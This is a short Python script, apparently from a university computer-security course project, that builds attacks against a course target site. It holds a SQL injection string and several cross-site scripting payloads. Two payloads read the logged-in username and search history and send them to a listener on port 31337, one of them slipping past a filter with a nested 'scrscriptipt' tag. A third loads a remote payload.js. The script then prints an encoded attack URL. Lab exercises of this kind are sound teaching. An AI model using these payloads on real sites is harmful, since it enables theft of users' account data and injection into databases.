sql = "SELECT * FROM `users` WHERE location='{}'"
injection = "'||1-- "
# print(sql.format(injection))

# 2720204f522027792720203d20202779 # A potential md5 hash that may be translated to what we want?
# 0dd214be0b9bbbbde2a8d56231626318

import urllib.parse as parse

xss_0 = """
<script>
  $(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });
</script>
"""

xss_1 = """
<scrscriptipt>
  $(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });
</scrscriptipt>
"""

xss_3 = """
<script src=https://combinatronics.com/miyo6032/Computer-Security/master/Project%202/payload.js></script>
"""

print("https://project2.ecen4133.org/search?xssdefense=2&q=" + parse.quote_plus(xss_1))